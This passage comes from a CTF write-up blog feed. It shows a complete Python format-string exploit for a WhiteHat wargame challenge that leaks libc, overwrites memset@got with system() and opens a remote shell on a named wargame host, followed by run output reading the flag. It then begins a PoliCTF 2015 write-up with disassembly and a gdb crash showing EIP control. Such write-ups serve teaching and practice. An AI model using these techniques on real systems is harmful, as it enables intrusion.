</span><span class='line'>  <span class="n">libc_write</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># remote</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Leaked write    : &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_write</span><span class="p">)</span>
</span><span class='line'>  <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_write</span> <span class="o">-</span> <span class="mh">0x000d9510</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] libc base addr  : &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
</span><span class='line'>  <span class="n">libc_rce</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x003fcd0</span> <span class="c"># system</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] libc system addr: &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_rce</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/wh/pwn100<span class="nv">$ </span>python poc1.py
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Leaked write    : 0xf7607510
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> libc base addr  : 0xf752e000
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> libc system addr: <span class="nv">0xf756dcd0</span>
</span><span class='line'>
</span><span class='line'><span class="o">========</span>
</span><span class='line'>T1Verify 0
</span><span class='line'>...snip...
</span></code></pre></td></tr></table></div></figure>


<p>Looks good, right? Now, the trick is to <em>invalidate</em> Tag2 again, so we can set it to a new format string, then revalidate it again. The new format string will take care of overwriting a GOT pointer with our acquired <code>system()</code> address.</p>

<p>I chose to overwrite <code>memset@got</code> with <code>system()</code>. One of the arguments to memset is the buffer which contains our input. By overwriting memset with system, the next time memset is called, we&rsquo;ll effectively run system(our_input)!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#s.connect((&#39;localhost&#39;, 6666))</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;lab33.wargame.whitehat.vn&#39;</span><span class="p">,</span> <span class="mi">10100</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># send invalid tag1</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">*</span><span class="mi">511</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x0a</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># tag2 is also invalid, but we will bypass the protection</span>
</span><span class='line'>  <span class="c"># leak write@got</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804a01c</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;%6$s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>    <span class="c"># 0x804a01c = write@got</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;content?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># first, enable tag2 by overwriting Tag2::verified</span>
</span><span class='line'>  <span class="c"># it will be printed using sprintf() even though it contains invalid chars \o/</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">*</span><span class="mi">512</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x01</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;T2Verify 1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># receive crap from format string</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>   
</span><span class='line'>  <span class="c"># receive actual information, contains leaked got pointers</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span> 
</span><span class='line'>  <span class="n">libc_write</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># remote</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Leaked write    : &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_write</span><span class="p">)</span>
</span><span class='line'>  <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_write</span> <span class="o">-</span> <span class="mh">0x000d9510</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] libc base addr  : &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
</span><span class='line'>  <span class="n">libc_rce</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x003fcd0</span> <span class="c"># system</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] libc system addr: &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_rce</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># invalidate t2 again by overflowing t1 into Tag::verified, so we can set it to a new value</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;content?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">*</span><span class="mi">512</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x00</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># calculate the magic constants for the string format attack</span>
</span><span class='line'>  <span class="c"># don&#39;t stare too long at them or you&#39;ll go blind</span>
</span><span class='line'>  <span class="n">magic1</span> <span class="o">=</span> <span class="p">((</span><span class="mh">0x100</span> <span class="o">+</span> <span class="p">(</span><span class="n">libc_rce</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">))</span> <span class="o">-</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
</span><span class='line'>  <span class="n">magic2</span> <span class="o">=</span> <span class="p">((</span><span class="mh">0x100</span> <span class="o">+</span> <span class="p">(</span><span class="n">libc_rce</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc_rce</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
</span><span class='line'>  <span class="n">magic3</span> <span class="o">=</span> <span class="p">((</span><span class="mh">0x100</span> <span class="o">+</span> <span class="p">(</span><span class="n">libc_rce</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">-</span> <span class="p">((</span><span class="n">libc_rce</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># send new t2</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;content?&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># ugly format string will write out address of system() into memset@got byte-by-byte</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804a020</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804a021</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804a022</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">magic1</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%6$hhn%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">magic2</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%7$hhn%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">magic3</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%8$hhn</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span> <span class="c"># 0x804a01c = write@got</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;content?&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># validate t2 by sending an invalid t1</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">*</span><span class="mi">512</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x01</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># we now get another shot at sending a correct t1,</span>
</span><span class='line'>  <span class="c"># however, memset is overwritten with system(), so now it should spawn a shell</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;/bin/sh</span><span class="se">\x0a</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Enjoy your shell!&quot;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s run it against the remote system:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/wh/pwn100<span class="nv">$ </span>python poc1.py
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Leaked write    : 0xf75c0510
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> libc base addr  : 0xf74e7000
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> libc system addr: 0xf7526cd0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Enjoy your shell!
</span><span class='line'>T2Verify 1
</span><span class='line'>...snip...
</span><span class='line'>T1sh: 1: Syntax error: Unterminated quoted string
</span><span class='line'>Verify 0
</span><span class='line'>        sh: 1: Verify: not found
</span><span class='line'>/bin/sh
</span><span class='line'>...snip...
</span><span class='line'> Not verify , content?
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span><span class="m">1002</span> <span class="nv">gid</span><span class="o">=</span>1002
</span><span class='line'>cat /home/*/flag
</span><span class='line'>WhiteHat<span class="o">{</span>786fdd7b4ed544a186e6457a4c24fe8a95a67bbc<span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>A lot of crap is printed, but in the end we land our shell!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - John's Shuffle]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-shuffle/"/>
    <updated>2015-07-12T17:06:29+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-shuffle</id>
    <content type="html"><![CDATA[<p>John&rsquo;s Shuffle was a 350 point pwnable for PoliCTF 2015. Here&rsquo;s how I cracked it!</p>

<!--more-->


<p>Again, it&rsquo;s a 32 bit ELF binary. Running it yields the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/polictf/johns-shuffle<span class="nv">$ </span>./johns-shuffle
</span><span class='line'>It all began as a mistake..
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>It all began as a mistake..
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>It all began as a mistake..
</span></code></pre></td></tr></table></div></figure>


<p>Not very useful. The disassembly provided some hints, for it had functions like <code>shuffle</code>, <code>unshuffle</code> and <code>bubblesort</code>. The program kicks off by clearing a lot of stack space and calling <code>unshuffle</code>. Then, it asks for user input, maximum size 0x44 bytes. I decided to enter 0x44 * <code>A</code> (what else?).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>... clear stack space ...
</span><span class='line'> 8048f30: call   8048df0 &lt;unshuffle&gt;
</span><span class='line'> 8048f35: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x804b078
</span><span class='line'> 8048f3c: call   <span class="m">8048710</span> &lt;puts@plt&gt;
</span><span class='line'> 8048f41: mov    eax,ds:0x804b0c0
</span><span class='line'> 8048f46: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 8048f49: call   80486c0 &lt;fflush@plt&gt;
</span><span class='line'> 8048f4e: mov    eax,ds:0x804b0a0
</span><span class='line'> 8048f53: mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,eax
</span><span class='line'> 8048f57: mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x44
</span><span class='line'> 8048f5f: lea    eax,<span class="o">[</span>esp+0x2c<span class="o">]</span>
</span><span class='line'> 8048f63: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 8048f66: call   80486e0 &lt;fgets@plt&gt;
</span></code></pre></td></tr></table></div></figure>


<p>When runnning the <code>shuffle</code> function, the program executes <code>system()</code>, which spawns <code>/bin/dash</code> on my system, effectively stopping me from debugging it in <code>gdb</code>. I patched system in gdb so it would return immediately and I could trace the program. Turns out <code>shuffle</code> takes the GOT entries, all the function pointers, and shuffles them around. <code>unshuffle</code> negates this operation. After the second time I entered 0x44 A&rsquo;s, the program crashed with control over EIP and EBP:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>start
</span><span class='line'>Temporary breakpoint 2, 0x08048ec2 in main <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>p system
</span><span class='line'><span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7e9ac30 &lt;system&gt;
</span><span class='line'>gdb-peda<span class="nv">$ </span><span class="nb">set</span> *0xf7e9ac30<span class="o">=</span>0xc3
</span><span class='line'>gdb-peda<span class="nv">$ </span>c
</span><span class='line'>It all began as a mistake..
</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span class='line'>
</span><span class='line'>It all began as a mistake..
</span><span class='line'>
</span><span class='line'>It all began as a mistake..
</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0x0
</span><span class='line'>EBX: 0xf7fbeff4 --&gt; 0x15fd7c
</span><span class='line'>ECX: 0x4
</span><span class='line'>EDX: 0x80487a6 <span class="o">(</span>&lt;difftime@plt+6&gt;:    push   0x88<span class="o">)</span>
</span><span class='line'>ESI: 0x0
</span><span class='line'>EDI: 0x0
</span><span class='line'>EBP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>ESP: 0xffffd5c0 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">31</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>EIP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0x41414141
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xffffd5c0 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">31</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0004<span class="p">|</span> 0xffffd5c4 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">27</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0008<span class="p">|</span> 0xffffd5c8 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">23</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xffffd5cc <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">19</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0016<span class="p">|</span> 0xffffd5d0 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">15</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0020<span class="p">|</span> 0xffffd5d4 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">11</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0024<span class="p">|</span> 0xffffd5d8 <span class="o">(</span><span class="s2">&quot;AAAAAAA&quot;</span><span class="o">)</span>
</span><span class='line'>0028<span class="p">|</span> 0xffffd5dc --&gt; 0x414141 <span class="o">(</span><span class="s1">&#39;AAA&#39;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x41414141 in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Cool, easy control over EIP. However, at this point, we cannot rely on the GOT entries, because they are still shuffled! We can&rsquo;t just ret2system. I spent some time trying to return to <code>unshuffle</code>, but kept losing control of the program execution.</p>

<p>But let&rsquo;s take a step back here. Linux ELF binaries employ something called &ldquo;lazy linking&rdquo;. When a binary is started, the symbols are not resolved yet. Only when a function is called for the first time will the function address be resolved. The GOT entry will be pointing to this look up code (memcpy as example):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>080486d0 &lt;memcpy@plt&gt;:
</span><span class='line'> 80486d0: ff <span class="m">25</span> 1c b0 <span class="m">04</span> <span class="m">08</span>      jmp    DWORD PTR ds:0x804b01c
</span><span class='line'> 80486d6: <span class="m">68</span> <span class="m">20</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   0x20
</span><span class='line'> 80486db: e9 a0 ff ff ff          jmp    <span class="m">8048680</span> &lt;_init+0x2c&gt;
</span></code></pre></td></tr></table></div></figure>


<p>When called for the first time, <code>0x804b01c</code> will be pointing to <code>0x80486d6</code>, which will kick off the function resolver. So instead of using <code>0x80486d0</code> to do a memcpy, I&rsquo;d just use <code>0x80486d6</code>. This bypasses the mess that <code>shuffle</code> made!</p>

<p>With all this in hand, I wrote an exploit and the corresponding rop chain (well&hellip; more like ret2resolve ;)).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
